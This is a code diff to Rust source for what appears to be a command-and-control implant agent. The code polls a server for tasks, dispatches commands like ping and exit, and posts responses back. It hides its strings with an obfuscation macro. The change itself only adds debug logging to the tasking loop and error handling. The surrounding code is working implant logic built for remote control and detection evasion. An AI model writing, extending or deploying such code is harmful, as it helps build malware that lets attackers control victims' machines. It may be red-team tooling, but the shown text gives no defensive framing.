@@ -23,14 +23,21 @@ pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
         obfstr!("tasking_size"): 10
     });
     let json_str = serde_json::to_string(&checkin_data)?;
+    crate::dlog!("getTasking: request");
     let json = transport::send_request_with_response(&json_str)?;
 
     let tasks = json.get(obfstr!("tasks")).ok_or("No tasks field")?;
-    for task in tasks.as_array().ok_or("Tasks not array")? {
+    let arr = tasks.as_array().ok_or("Tasks not array")?;
+    crate::dlog!("getTasking: {} task(s)", arr.len());
+    for task in arr {
         if let Some(cmd) = task.get("command").and_then(|v| v.as_str()) {
             crate::helpers::churn(cmd);
         }
         if let Err(e) = handleTask(task) {
+            crate::dlog!(
+                "getTasking: handleTask err task_id={:?}: {e}",
+                task.get("id")
+            );
             if let Some(task_id) = task.get("id").and_then(|v| v.as_str()) {
                 let err_resp = serde_json::json!({
                     obfstr!("action"): obfstr!("post_response"),
@@ -51,6 +58,7 @@ pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
 pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
     let command = task.get("command").unwrap().as_str().unwrap();
     let id = task.get("id").unwrap().as_str().unwrap();
+    crate::dlog!("handleTask: id={id} cmd={command}");
 
     if command == obfstr!("ping") { pong::pong(task)?; return Ok(()); }
     if command == obfstr!("exit") { exit::exit(task)?; return Ok(()); }
